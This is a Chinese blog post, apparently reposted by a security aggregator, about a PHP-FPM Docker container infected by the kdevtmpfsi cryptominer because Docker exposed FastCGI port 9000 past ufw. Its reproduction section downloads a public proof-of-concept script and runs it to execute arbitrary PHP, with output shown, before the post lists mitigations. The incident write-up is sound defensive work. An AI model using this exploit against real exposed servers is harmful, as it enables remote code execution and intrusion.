---
title: PHP的Docker容器感染kdevtmpfsi挖矿病毒
url: https://buaq.net/go-140512.html
source: unSafe.sh - 不安全
date: 2022-12-19
fetch_date: 2025-10-04T01:53:10.178629
---

# PHP的Docker容器感染kdevtmpfsi挖矿病毒

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

PHP的Docker容器感染kdevtmpfsi挖矿病毒

本文目录感染kdevtmpfsi挖矿病毒PHP的Docker容器被挖矿原因不可暴露于外望的FastCGI协议解决办法总结参考 感染kdevtmpfsi挖矿病毒昨天闲着无事，登陆服务器，发现一个名为 k
*2022-12-18 20:56:29
Author: [itlanyan.com(查看原文)](/jump-140512.htm)
阅读量:93
收藏*

---

本文目录

* [感染kdevtmpfsi挖矿病毒](#bnp_i_1)
* [PHP的Docker容器被挖矿原因](#bnp_i_2)
* [不可暴露于外望的FastCGI协议](#bnp_i_3)
* [解决办法](#bnp_i_4)
* [总结](#bnp_i_5)
* [参考](#bnp_i_6)

## 感染kdevtmpfsi挖矿病毒

昨天闲着无事，登陆服务器，发现一个名为 `kdevtmpfsi` 的进程占据了全部的CPU资源。第一眼还以为是调度类系统进程，过了一会还占据这么高资源，于是猜到应该是挖矿病毒。

Google了一下，确实是挖矿病毒，被感染的不在少数。其有名为 `kinsing` 的守护进程，当 `kdevtmpfsi` 被杀掉后，会自动唤起。再细查，由于本站运行在[Docker](https://itlanyan.com/tag/docker)容器内，该病毒的进程也都是在容器内，宿主机内没发现被感染。

## PHP的Docker容器被挖矿原因

清除病毒容易，但要搞清楚怎么被感染的，否则很容易又被黑。网上不少文章都说是由于 [redis](https://itlanyan.com/tag/redis) 端口暴露在外网且没有权限认证导致。本人的情况应该不是redis导致，因为以下两点：

1. 容器内确实有redis实例，但并不对外开放端口；

2. 如果是redis实例导致的，病毒程序的运行用户应该是redis而非运行PHP-FPM的www-data！

为了证明和redis无关，重新使用了没有redis的镜像。运行一段时间后，还是被感染了，说明和redis无关。

那到底是什么原因呢？应该不是Nginx，其只提供静态请求及转发；和[PHP](https://itlanyan.com/category/php)的版本也无关，不管PHP 7还是PHP 8，运行一段时间后都会被感染；和php/fpm设置也无关，之前没有用Docker部署前，一直都很正常…

就在快要放弃的时候，忽然看到网上说Docker的`-p`端口映射会绕过ufw直接对外开放。马上测试一下，发现果然可以从外部机器`telnet`到FPM监听的9000端口。觉得天雷滚滚的同时，又感到有点欣慰：终于找到被感染的原因了！

## 不可暴露于外望的FastCGI协议

开始聊具体原因和复现之前，先说一下本人的防火墙设置。`ufw` 命令输出如下：

```
[email protected]:~# ufw status
Status: active

To                         Action      From
--                         ------      ----
80/tcp                     ALLOW       Anywhere
443                        ALLOW       Anywhere
xxx/tcp cc                 ALLOW       Anywhere
Anywhere                   ALLOW       172.17.0.0/24
80/tcp (v6)                ALLOW       Anywhere (v6)
443 (v6)                   ALLOW       Anywhere (v6)
xxx/tcp (v6)cc             ALLOW       Anywhere (v6)
```

可以看到，除了SSH、HTTP(s)及Docker容器，理论上屏蔽了所有外部的主动连接。

网站通过自制的FPM镜像部署，启动时将FPM监听的9000端口暴露出来：

```
docker run -d -p 9000:9000 xxxxx fpm
```

没发生这个病毒感染前，我一直以为如上配置的防火墙能够屏蔽外网对9000端口的访问。实际上是我错了！Docker上述方式暴露的端口会绕过ufw直接暴露出去，且不会出现在 `ufw` 命令输出中！要验证也很简单，直接从外网 `telnet` 一下，想深究的可以通过 `iptables` 命令看到9000端口确实接受任何外部连接！

但是PHP-FPM的FastCGI协议应该仅在内网使用，暴露在外网是致命的！例如多年前的这篇文章 [Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html) 就分析了FastCGI的问题，根据里面的方法，能很轻松的getshell并实现RCE！

接下来使用实例说明就是暴露的9000端口导致被挖矿病毒感染。首先创建一个开放9000端口的FPM容器：

```
docker run -d --rm -p 9000:9000 bitnami/php-fpm:7.4.33
```

下载证明FastCGI漏洞的POC脚本：

```
wget https://gist.githubusercontent.com/phith0n/9615e2420f31048f7e30f3937356cf75/raw/ffd7aa5b3a75ea903a0bb9cc106688da738722c5/fpm.py
```

运行脚本执行任意代码：

```
python3 fpm.py -p 9000 127.0.0.1 /opt/bitnami/php/lib/php/PEAR.php \
-c '<?php echo `ls -l`; exit; ?>'
```

输出如下：

```
X-Powered-By: PHP/7.4.33
Content-type: text/html; charset=UTF-8

total 120
drwxr-xr-x  2 root root  4096 Nov 23 20:31 Archive
drwxr-xr-x  2 root root  4096 Nov 23 20:31 Console
drwxr-xr-x  2 root root  4096 Nov 23 20:31 OS
drwxr-xr-x 11 root root  4096 Nov 23 20:31 PEAR
-rw-r--r--  1 root root 36171 Nov 23 19:46 PEAR.php
drwxr-xr-x  3 root root  4096 Nov 23 20:31 Structures
-rw-r--r--  1 root root 20694 Nov 23 19:46 System.php
drwxr-xr-x  2 root root  4096 Nov 23 20:31 XML
drwxr-xr-x  2 root root  4096 Nov 23 20:31 build
drwxr-xr-x  3 root root  4096 Nov 23 20:31 data
drwxr-xr-x  2 root root  4096 Nov 23 20:31 extensions
-rw-r--r--  1 root root 14845 Nov 23 19:46 pearcmd.php
-rw-r--r--  1 root root  1113 Nov 23 19:46 peclcmd.php
drwxr-xr-x  5 root root  4096 Nov 23 20:31 test
```

可以看到，我们顺利的执行了任意代码！

此外有两个值得说明的地方：

1. 执行攻击时并不需要和FPM容器在同一台机器上，只要能访问到暴露出来的FastCGI端口即可。对于上面的例子，从外网攻击也是同样的效果；

2. 触发的文件可以是任意有效的PHP文件（登录容器后执行find / -name \*.php可查看容器自带的PHP文件）；甚至还可以不是PHP文件，例如将文件从 `/opt/bitnami/php/lib/php/PEAR.php` 换成 `/opt/bitnami/php/bin/phar.phar`，代码同样被运行。

从这个实验可以看到服务器被病毒挖矿的两个根本原因：

1. 运行Docker容器时，对外暴露了FastCGI端口；

2. Docker暴露的端口绕过了ufw的限制，导致可以从外部任意访问，进而被下载挖矿病毒。

## 解决办法

找到了问题原因，接下来就比较简单了。防止再次出现的方法主要有三种：

1. 暴露端口时仅监听本机：`-p 127.0.0.1:9000:9000`；

2. 使用unix socket文件通信，不使用端口；

3. 使用docker网络而不是暴露端口。

当然可可以让Docker不自动修改iptables等手段，但是上面三种已经足够用了。本文通过socket文件的方式重新构建了镜像并运行网站，到目前为止未发现再次被感染。

## 总结

在网上搜“php docker kdevtmpfsi”，能找到许多被挖矿病毒感染的例子。其根本原因和redis无关，而是启动Docker容器时将FastCGI的通信端口直接暴露在了外网。PHP-FPM的FastCGI通信协议应当只在内网使用，暴露在外网将面临非常严重的安全风险，因此使用PHP-FPM的Docker镜像时要十分慎重。

## 参考

1. [清除Linux服务器Docker中的kdevtmpfsi挖矿病毒](https://segmentfault.com/a/1190000042305570)
2. [Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)
3. [Protect your Docker containers from Kinsing – Kdevtmpfsi crypto mining malware](https://www.reddit.com/r/docker/comments/k2lwvd/protect_your_docker_containers_from_kinsing/)
4. [Problem with Malware on VPS (Docker/PHP)](https://www.blackhatworld.com/seo/problem-with-malware-on-vps-docker-php.1282016/)
5. [Uncomplicated Firewall (UFW) is not blocking anything when using Docker](https://askubuntu.com/questions/652556/uncomplicated-firewall-ufw-is-not-blocking-anything-when-using-docker)
6. [记一次服务器被入侵挖矿](https://itlanyan.com/server-being-hacked-log/)
7. [做一个永不暴露真实IP的网站](https://itlanyan.com/do-hide-site-real-ip/)

赞(1)

文章来源: https://itlanyan.com/php-docker-kdevtmpfsi-mining-virus/
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)